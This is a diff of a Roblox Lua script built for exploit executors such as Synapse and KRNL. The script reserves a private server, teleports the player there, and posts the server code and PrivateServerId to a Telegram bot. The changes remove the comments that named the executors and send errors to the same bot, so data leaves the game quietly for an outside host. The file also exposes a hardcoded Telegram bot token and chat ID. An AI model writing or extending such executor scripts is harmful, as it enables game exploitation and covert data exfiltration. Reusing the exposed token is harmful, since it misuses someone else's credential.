@@ -4,30 +4,33 @@ local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 
 -- Configuration
-local PLACE_ID = 126884695634066 -- Replace with your actual place ID
+local PLACE_ID = 126884695634066
 local TELEGRAM_URL = "https://api.telegram.org/bot8446879035:AAH1DGTI_M8FAX0y0RNVv8q1k1MsOhMj6e4/sendMessage"
 local TELEGRAM_CHAT_ID = "2001061743"
 
--- HTTP request function (supports Synapse, KRNL, etc.)
+-- HTTP request function
 local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
 
--- Function to send code to Telegram
-local function sendServerCodeToTelegram(code)
-    local message = "Reserved Private Server Code:\n" .. code
+-- Function to send log to Telegram
+local function sendTelegramLog(text)
     local payload = {
         Url = TELEGRAM_URL,
         Method = "POST",
         Headers = {["Content-Type"] = "application/json"},
         Body = HttpService:JSONEncode({
             chat_id = TELEGRAM_CHAT_ID,
-            text = message
+            text = text
         })
     }
 
     if requestFunc then
-        pcall(function()
-            requestFunc(payload)
+        local success, result = pcall(function()
+            return requestFunc(payload)
         end)
+
+        if not success then
+            warn("Telegram request failed:", result)
+        end
     else
         warn("No HTTP request function available!")
     end
@@ -36,18 +39,17 @@ end
 -- Reserve server and teleport
 local function reserveAndTeleport()
     -- Reserve a private server
-    local code = TeleportService:ReserveServer(PLACE_ID)
-    print("Reserved Server Code:", code)
+    local code, privateServerId = TeleportService:ReserveServer(PLACE_ID)
 
     -- Send code to Telegram
-    sendServerCodeToTelegram(code)
+    sendTelegramLog("✅ Reserved Private Server Code:\n" .. code .. "\n🆔 PrivateServerId:\n" .. privateServerId)
 
     -- Teleport local player to the reserved server
     local player = Players.LocalPlayer
     if player then
         TeleportService:TeleportToPrivateServer(PLACE_ID, code, {player})
     else
-        warn("Local player not found!")
+        sendTelegramLog("⚠️ ERROR: Local player not found!")
     end
 end
 
